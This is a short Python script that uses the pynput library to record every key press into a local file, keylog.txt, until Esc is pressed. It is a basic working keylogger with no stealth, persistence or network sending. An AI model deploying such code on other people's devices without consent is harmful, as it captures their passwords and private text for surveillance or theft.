from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    with open(LOG_FILE, "a") as f:
        try:
            f.write(f'{key.char}')
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.tab:
                f.write('\t')
            else:
                f.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
